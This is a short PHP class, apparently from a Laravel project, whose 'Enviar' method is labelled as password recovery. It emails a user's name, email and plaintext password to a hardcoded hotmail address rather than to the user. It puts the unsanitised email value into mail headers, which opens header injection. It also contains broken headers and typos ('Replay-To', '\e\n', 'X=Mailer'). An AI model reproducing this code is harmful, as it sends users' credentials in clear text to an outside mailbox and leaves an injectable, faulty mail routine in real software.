<?php

namespace App\Http\Controllers\Repository;

class Email
{
    public function Enviar($email,$nome,$senha){
            
            
            $to = "hunkjf2@hotmail.com";
            $subeject = "Recuperação de senha - Senhor(@): $nome";
    
            $body = 
            '<table width="0%" border="0">
            <br>
            <tr>
            <td><b>Nome:</b></td><td>'.$nome.'</td>
            </tr>
            <tr>
            <td><b>E-mail:</b></td><td>'.$email.'</td>
            </tr>
            <tr>
            <td><b>Senha:</b></td><td>'.$senha.'</td>
            </tr>
            <tr></table>';
        
            $header = "From: $email"."\r\n".
                       "Content-type: text/html; charset=utf-8" . "\r\n".
                       "Replay-To:".$email."\e\n".
                       "X=Mailer:PHP/".phpversion();
            
  
              mail($to,$subeject,$body,$header);
    
    }


}